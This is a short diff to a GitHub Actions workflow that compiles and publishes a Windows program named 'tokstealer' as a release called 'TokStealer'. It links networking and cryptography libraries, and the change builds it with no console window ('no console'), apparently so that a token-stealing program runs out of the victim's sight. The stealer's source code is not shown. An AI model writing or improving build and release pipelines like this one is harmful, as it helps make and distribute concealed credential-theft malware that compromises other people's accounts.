@@ -21,7 +21,7 @@ jobs:
         set "VSWHERE=%ProgramFiles(x86)%\Microsoft Visual Studio\Installer\vswhere.exe"
         for /f "usebackq tokens=*" %%i in (`"%VSWHERE%" -latest -products * -requires Microsoft.VisualStudio.Component.VC.Tools.x86.x64 -property installationPath`) do set "VSPATH=%%i"
         call "%VSPATH%\VC\Auxiliary\Build\vcvars64.bat"
-        cl /std:c++17 /EHsc /O2 /DNDEBUG /MD tokstealer.cpp /link winhttp.lib bcrypt.lib crypt32.lib /MACHINE:X64 /OUT:tokstealer.exe
+        cl /std:c++17 /EHsc /O2 /DNDEBUG /MD tokstealer.cpp /link winhttp.lib bcrypt.lib crypt32.lib shell32.lib /SUBSYSTEM:WINDOWS /ENTRY:mainCRTStartup /MACHINE:X64 /OUT:tokstealer.exe
 
     - name: List directory for debugging
       shell: cmd
@@ -44,7 +44,7 @@ jobs:
       with:
         tag_name: TokStealer
         release_name: TokStealer
-        body: "Release created by GitHub Actions (manual build)"
+        body: "Release created by GitHub Actions (manual build, no console)"
         draft: false
         prerelease: false
 
